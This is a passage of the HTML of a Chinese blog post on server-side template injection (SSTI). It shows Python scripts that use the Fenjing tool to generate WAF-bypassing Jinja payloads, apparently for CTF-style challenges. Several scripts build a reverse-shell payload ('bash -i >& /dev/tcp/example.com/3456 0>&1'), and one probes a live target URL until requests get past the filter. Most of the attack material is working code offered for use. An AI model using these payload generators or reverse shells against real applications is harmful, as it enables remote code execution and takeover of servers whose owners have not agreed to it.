class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>,<br>        <span class="hljs-string">&quot;０&quot;</span>,<span class="hljs-string">&quot;１&quot;</span>,<span class="hljs-string">&quot;２&quot;</span>,<span class="hljs-string">&quot;３&quot;</span>,<span class="hljs-string">&quot;４&quot;</span>,<span class="hljs-string">&quot;５&quot;</span>,<span class="hljs-string">&quot;６&quot;</span>,<span class="hljs-string">&quot;７&quot;</span>,<span class="hljs-string">&quot;８&quot;</span>,<span class="hljs-string">&quot;９&quot;</span><br>    ]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, _ = exec_cmd_payload(waf, <span class="hljs-string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;</span>)<br>    <span class="hljs-comment"># config_payload = config_payload(waf)</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload"><a href="#在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload" class="headerlink" title="在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload"></a>在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload</h5><p>比如说如果提交的payload被WAF后，WAF页面含有”BAD”这三个字母，那么可以这么写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload<br><br><br>URL = <span class="hljs-string">&quot;http://10.137.0.28:5000&quot;</span><br><br><br><span class="hljs-meta">@functools.lru_cache(<span class="hljs-params"><span class="hljs-number">1000</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">payload: <span class="hljs-built_in">str</span></span>):  <span class="hljs-comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span><br>    time.sleep(<span class="hljs-number">0.02</span>) <span class="hljs-comment"># 防止请求发送过多</span><br>    resp = requests.get(URL, timeout=<span class="hljs-number">10</span>, params=&#123;<span class="hljs-string">&quot;name&quot;</span>: payload&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;BAD&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, will_print = exec_cmd_payload(<br>        waf, <span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1&quot;&#x27;</span><br>    )<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显！&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h5 id="让生成器学会使用新的变量"><a href="#让生成器学会使用新的变量" class="headerlink" title="让生成器学会使用新的变量"></a>让生成器学会使用新的变量</h5><p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing/issues/4">参考</a></p>
+<p>比如说你想让生成器学会使用新的变量<code>aaa</code>，它的值是100，需要在payload的前面加上<code>&#123;%set aaa=0x64%&#125;</code>，那你只需要这么写</p>
+<pre><code class="python">from fenjing.full_payload_gen import FullPayloadGen
+from fenjing.const import OS_POPEN_READ
+import logging
+logging.basicConfig(level = logging.INFO)
+
+def waf(s: str): # 这个函数因题目而定
+    blacklist = [
+        &quot;00&quot;, &quot;1&quot;, &quot;3&quot;, &quot;5&quot;, &quot;7&quot;, &quot;9&quot;
+    ]
+    return all(word not in s for word in blacklist)
+
+if __name__ == &quot;__main__&quot;:
+    full_payload_gen = FullPayloadGen(waf)
+    full_payload_gen.do_prepare()
+    full_payload_gen.add_context_variable(&quot;&#123;%set aaa=0x64%&#125;&quot;, &#123;&quot;aaa&quot;: 100&#125;)
+    shell_payload, will_print = full_payload_gen.generate(OS_POPEN_READ, &quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\&quot;&quot;)
+    if not will_print:
+        print(&quot;这个payload不会产生回显&quot;)
+    print(f&quot;&#123;shell_payload=&#125;&quot;)
+</code></pre>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://example.com/2024/09/23/漏洞-SSTI/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Beitragsautor</div>
+          <div>FHK_KMD6377</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Veröffentlicht am</div>
+          <div>September 23, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Urheberrechtshinweis</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/23/%E6%BC%8F%E6%B4%9E-SSRF/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/23/%E6%BC%8F%E6%B4%9E-XEE/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Inhaltsverzeichnis</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
